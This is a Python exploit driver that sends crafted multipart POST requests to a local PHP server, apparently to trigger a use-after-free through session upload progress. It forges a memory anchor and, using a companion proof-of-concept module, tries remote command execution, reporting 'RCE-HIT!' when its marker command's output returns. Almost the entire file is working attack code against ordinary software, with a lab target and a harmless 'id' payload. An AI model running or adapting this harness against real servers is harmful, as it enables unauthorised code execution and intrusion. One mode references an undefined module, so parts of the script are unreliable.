#!/usr/bin/env python3
"""Fire UAF bodies at the local lab. Usage: fire.py <mode> [sid]"""
import sys, socket, time, uuid
sys.path.insert(0, '.')
import poc0_109618 as poc

def send(host, port, head, phase1, tail, stall=1.4):
    s = socket.create_connection((host, port), timeout=25)
    s.sendall(head + phase1)
    time.sleep(stall)
    try:
        s.sendall(tail)
    except (BrokenPipeError, ConnectionResetError):
        s.close(); return b'', 'TAIL-FAILED(early crash?)'
    s.settimeout(15)
    out, dead = b'', False
    try:
        while True:
            d = s.recv(65536)
            if not d: break  # Connection: close = normal EOF
            out += d
    except socket.timeout: pass
    s.close()
    return out, ('CONN-CLOSED-EARLY' if dead else None)

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'forge'
    sid = (sys.argv[2] if len(sys.argv) > 2 else 'atlas' + uuid.uuid4().hex[:24])
    host, port = '127.0.0.1', 8080
    if mode == 'benign':
        B = b'----x'
        def part(n, v, f=None):
            d = f'Content-Disposition: form-data; name="{n}"'
            if f: d += f'; filename="{f}"'
            return b'--' + B + b'\r\n' + d.encode() + b'\r\n\r\n' + v + b'\r\n'
        body = part(b'PHPSESSID', sid.encode()) + part(b'PHP_SESSION_UPLOAD_PROGRESS', b'x') \
             + part(b'f', b'', 'a') + b'A' * 5184 + b'\r\n' + b'--' + B + b'--\r\n'
        head = (f'POST / HTTP/1.1\r\nHost: h\r\nCookie: PHPSESSID={sid}\r\n'
                f'Content-Type: multipart/form-data; boundary=----x\r\n'
                f'Content-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
        resp, err = send(host, port, head, body, b'', 0)
    elif mode == 'trigger':
        body = poc_trigger.build_body() if False else None
        sys.exit('use trigger mode via poc_trigger directly')
    else:  # forge
        anchor = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x4141414142424242
        poc.N149 = 90
        phase1, tail, meta = poc.build(sid, b'echo JACKALPOC_LAB; id', anchor)
        head = (f'POST / HTTP/1.1\r\nHost: h\r\nCookie: PHPSESSID={sid}\r\n'
                f'User-Agent: php2shell-109618\r\n'
                f'Content-Type: multipart/form-data; boundary=B7kQpoc618\r\n'
                f'Content-Length: {len(phase1)+len(tail)}\r\nConnection: close\r\n\r\n').encode()
        resp, err = send(host, port, head, phase1, tail)
    status = resp.split(b'\r\n', 1)[0].decode('latin1', 'replace') if resp else 'NO-RESPONSE'
    print(f'MODE={mode} SID={sid} STATUS={status} ERR={err} BYTES={len(resp)}')
    hit = b'JACKALPOC_LAB' in resp
    if hit: print('RCE-HIT!')
    tail_txt = resp.split(b'\r\n\r\n', 1)[-1][-400:] if resp else b''
    print('BODYTAIL:', tail_txt.decode('latin1', 'replace').replace('\n', ' ')[:380])
    return 0

if __name__ == '__main__':
    sys.exit(main())
